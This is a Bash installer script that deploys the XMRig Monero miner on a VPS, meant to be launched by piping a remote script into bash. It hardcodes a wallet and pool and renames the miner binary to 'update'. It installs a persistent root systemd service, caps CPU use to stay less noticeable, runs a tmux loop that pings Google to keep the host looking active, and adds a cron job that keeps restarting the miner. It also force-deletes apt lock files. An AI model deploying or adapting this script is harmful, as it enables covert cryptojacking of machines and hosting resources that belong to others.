#!/bin/bash

# =============================
# ⚒️ Auto XMRig Miner Installer for VPS (24/7 Uptime)
# ✅ Includes all error handling and keep-alive tricks
# 💬 Usage: bash <(curl -s https://your-link.com/install.sh) v7
# =============================

# ========== Configurable ============
WORKER="$1"
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
POOL="gulf.moneroocean.stream:10128"

if [ -z "$WORKER" ]; then
  echo "❌ ERROR: Worker name not provided!"
  echo "Usage: bash <(curl -s YOUR_LINK) v7"
  exit 1
fi

# ========== Unlock APT Locks ============
echo "🔓 Unlocking any locked files..."
sudo rm -rf /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock /var/cache/apt/archives/lock 2>/dev/null || true
sudo dpkg --configure -a || true

# ========== Install Required Tools ============
echo "📦 Installing required packages..."
sudo apt update -y && sudo apt install -y curl git wget tar sudo tmux cron >/dev/null 2>&1 || true

# ========== Create Directories ============
echo "📁 Creating directories..."
sudo mkdir -p /root/Documents/build && cd /root/Documents/build || exit 1

# ========== Download Latest XMRig Release ============
echo "⬇️  Downloading latest XMRig release..."
LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-x64 | cut -d '"' -f 4 | head -n1)
wget -q "$LATEST_URL" -O xmrig.tar.gz || { echo "❌ Failed to download XMRig."; exit 1; }
tar -xf xmrig.tar.gz || { echo "❌ Failed to extract XMRig."; exit 1; }
mv xmrig-*/xmrig update && chmod +x update

# ========== Create Systemd Service ============
echo "🛠️  Creating systemd service..."
cat <<EOF | sudo tee /etc/systemd/system/xmrig-wrapper.service >/dev/null
[Unit]
Description=Custom XMRig Miner Wrapper
After=network.target

[Service]
ExecStart=/root/Documents/build/update -o $POOL -u $WALLET -k --tls -p $WORKER --max-cpu-usage=80
Nice=10
Restart=always
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF

# ========== Enable & Start Service ============
echo "🚀 Starting miner service..."
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable xmrig-wrapper.service
sudo systemctl start xmrig-wrapper.service

# ========== Setup Tmux Keep-Alive ============
echo "🧠 Launching tmux keep-alive..."
tmux new-session -d -s miner "while true; do curl -s https://google.com > /dev/null; sleep 20; done"

# ========== Setup Cron Health Check ============
echo "📆 Setting up cron job health check..."
(crontab -l 2>/dev/null; echo "*/5 * * * * systemctl restart xmrig-wrapper.service || true") | crontab -

# ========== Summary Output ============
STATUS=$(systemctl is-active xmrig-wrapper)
echo "=========================================="
echo "✅ Miner $WORKER is configured and running"
echo "🛠️  Binary: /root/Documents/build/update"
echo "📝 Logs: /root/desktop.log"
echo "📦 Service: xmrig-wrapper [Status: $STATUS]"
echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
echo "🔍 Logs:    journalctl -u xmrig-wrapper -f"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
